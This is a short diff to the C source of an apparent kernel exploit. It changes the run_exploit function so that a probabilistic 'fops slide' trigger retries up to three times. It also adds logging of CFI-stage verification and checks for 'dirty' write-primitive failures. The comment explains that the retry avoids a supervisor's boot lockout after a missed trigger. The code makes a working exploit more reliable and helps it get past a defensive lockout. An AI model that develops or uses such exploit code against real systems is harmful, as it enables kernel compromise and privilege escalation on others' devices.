@@ -427,9 +427,24 @@ int run_exploit(int argc, char **argv) {
 #endif
 #endif
 #else
-  for (int attempt = 1; attempt <= 1; attempt++) {
+  /*
+   * A step-4 miss with dirty==0 wrote nothing through the primitive, so
+   * re-triggering in-process is safe and avoids the supervisor's
+   * boot lockout for a probabilistic trigger miss.  Dirty failures
+   * (cfi_dirty_seen) still break immediately.
+   */
+#ifndef FOPS_TRIGGER_ATTEMPTS
+#define FOPS_TRIGGER_ATTEMPTS 3
+#endif
+  for (int attempt = 1; attempt <= FOPS_TRIGGER_ATTEMPTS; attempt++) {
     int triggered = app_trigger_fops_slide_route();
+    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
+            attempt, triggered);
     int verified = triggered && try_cfi_stage();
+    pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
+            "step=%d errno=%d\n",
+            attempt, FOPS_TRIGGER_ATTEMPTS, triggered, verified,
+            cfi_last_step, cfi_last_errno);
     if (verified || cfi_dirty_seen) {
       break;
     }
